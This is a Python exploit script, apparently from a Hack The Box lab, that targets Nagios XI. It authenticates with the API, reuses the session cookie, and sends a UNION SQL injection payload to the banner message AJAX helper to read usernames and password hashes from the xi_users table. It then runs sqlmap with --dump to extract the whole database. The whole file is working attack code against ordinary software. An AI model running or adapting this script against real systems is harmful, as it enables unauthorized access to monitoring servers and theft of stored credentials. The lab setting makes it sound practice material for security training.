#!/usr/bin/env python3

import requests
import subprocess
from colorama import Fore, Style

# Suppress SSL warnings (if using self-signed certs)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://nagios.monitored.htb/nagiosxi"
AUTH_ENDPOINT = "/api/v1/authenticate"
SQLI_ENDPOINT = "/admin/banner_message-ajaxhelper.php"
USERNAME = "CHNAGEME"
PASSWORD = "CHANGEME"

def main():
    # 1) Create a session to store cookies automatically
    session = requests.Session()
    session.verify = False  # ignore SSL cert issues if needed

    # 2) Get the auth token from the API
    auth_url = f"{BASE_URL}{AUTH_ENDPOINT}"
    data = {"username": USERNAME, "password": PASSWORD}
    try:
        r = session.post(auth_url, data=data)
        r.raise_for_status()
        token_data = r.json()
        auth_token = token_data.get("auth_token")
        if not auth_token:
            print(f"{Fore.RED}[-] Failed to retrieve auth token.{Style.RESET_ALL}")
            return
        print(f"{Fore.GREEN}[+] Auth token obtained: {auth_token}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error obtaining authentication token: {e}{Style.RESET_ALL}")
        return

    # 3) Load the main page with ?token=...
    #    This step is crucial to let Nagios XI set the correct session cookie(s).
    try:
        main_page_url = f"{BASE_URL}/index.php?token={auth_token}"
        r = session.get(main_page_url)
        if "Logged in as" in r.text or r.status_code == 200:
            print(f"{Fore.GREEN}[+] Main page loaded successfully with token.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] Main page loaded but did not detect expected content. "
                  f"Status: {r.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error loading main page: {e}{Style.RESET_ALL}")
        return

    # 4) (Optional) Perform the basic SQL injection check with the session
    #    This is your existing proof-of-concept request:
    sqli_url = f"{BASE_URL}{SQLI_ENDPOINT}"
    poc_payload = {
        "action": "acknowledge_banner_message",
        "id": "1 UNION SELECT 1, username, password FROM xi_users-- -"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        r = session.post(sqli_url, data=poc_payload, headers=headers)
        r.raise_for_status()
        print(f"{Fore.GREEN}[+] SQL Injection POC Response:\n{Style.RESET_ALL}{r.text}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error during SQL injection POC: {e}{Style.RESET_ALL}")

    # 5) Let sqlmap do the heavy lifting to DUMP the DB
    #    5a) Construct a proper cookie string from the session
    cookies_dict = session.cookies.get_dict()
    cookie_str = "; ".join([f"{k}={v}" for k, v in cookies_dict.items()])

    #    5b) Build the sqlmap command:
    #        -u / --url : Our target endpoint
    #        --data    : The POST parameters with the vulnerable 'id'
    #        --cookie  : The valid cookie so the request is authenticated
    #        -p id     : Tells sqlmap that 'id' is the injectable parameter
    #        --batch   : Non-interactive; automatically say "yes" to prompts
    #        --dump    : Dump everything from the DB
    #        (Optional) You can add --risk=3 --level=5 for more intense testing.

    sqlmap_cmd = [
        "sqlmap",
        "-u", f"{sqli_url}",                 # Or --url
        "--data=action=acknowledge_banner_message&id=1",  # We'll let sqlmap figure out injection
        "--cookie", cookie_str,             # Provide the valid cookies
        "-p", "id",                         # Parameter to test
        "--batch",                          # Run without prompts
        "--dump"                            # Dump all data
    ]

    print(f"\n{Fore.CYAN}[*] Running sqlmap to dump the database...{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}[*] Command: {' '.join(sqlmap_cmd)}{Style.RESET_ALL}\n")

    subprocess.run(sqlmap_cmd)

if __name__ == "__main__":
    main()
